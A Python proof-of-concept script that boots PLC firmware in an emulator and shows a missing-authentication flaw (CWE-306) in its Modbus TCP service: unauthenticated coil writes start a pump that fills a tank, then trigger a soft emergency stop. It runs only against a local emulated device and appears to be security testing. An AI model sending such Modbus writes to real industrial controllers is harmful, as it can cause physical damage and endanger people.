import os,shutil,socket,subprocess,time,struct,re
Q="/home/claude/qemu-esp/build/qemu-system-xtensa"
M="/mnt/user-data/uploads/m5stamplc_openplc/firmware/.pio/build/m5stamplc/merged-tbd.bin"
F="/home/claude/fwtest/flash.bin"; CDC="/home/claude/fwtest/hp_cdc.log"
shutil.copyfile(M,F); open(F,"r+b").truncate(8*1024*1024)
try:os.remove(CDC)
except OSError:pass
qp=subprocess.Popen([Q,"-M","esp32s3","-m","8M","-drive",f"file={F},if=mtd,format=raw",
    "-serial","null","-serial","null","-serial",f"file:{CDC}","-nographic","-no-reboot"],
    stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
t0=time.time()
while time.time()-t0<32:
    try:
        if "Modbus] TCP" in open(CDC,errors="replace").read(): break
    except OSError: pass
    time.sleep(0.3)
time.sleep(2)
sk=None
for _ in range(10):
    try: sk=socket.create_connection(("127.0.0.1",502),timeout=3); break
    except Exception: time.sleep(1)
tid=0
def tx(fc,a,q,extra=b""):
    global tid; tid+=1
    pdu=struct.pack(">BHH",fc,a,q)+extra
    sk.sendall(struct.pack(">HHHB",tid,0,len(pdu)+1,1)+pdu); return sk.recv(256)
def last_grove():
    txt=open(CDC,errors="replace").read()
    gl=[l for l in txt.splitlines() if "[GROVE]" in l and "weight_raw=" in l]
    return gl[-1] if gl else "(no telemetry yet)"
def wraw(line):
    m=re.search(r"weight_raw=(-?\d+)",line); return int(m.group(1)) if m else None
print("[demo] modbus:502 connected:", bool(sk))
print("\n=== BASELINE (pump idle) ===")
for _ in range(3):
    time.sleep(2); print("  ", last_grove())
print("\n=== ATTACK: unauth Modbus write coil 9 (cmd_run)=ON -> pump fills tank (CWE-306) ===")
tx(5,9,0xFF00)
base=wraw(last_grove())
for i in range(8):
    time.sleep(2); l=last_grove(); w=wraw(l)
    d=(f"  (+{w-base} counts vs baseline)" if (w is not None and base is not None) else "")
    print("  ", l, d)
print("\n=== unauth Modbus write coil 8 (soft_estop)=ON -> pump stops, tank drains ===")
tx(5,8,0xFF00)
for i in range(4):
    time.sleep(2); print("  ", last_grove())
sk.close(); qp.terminate()
try:qp.wait(timeout=5)
except Exception:qp.kill()
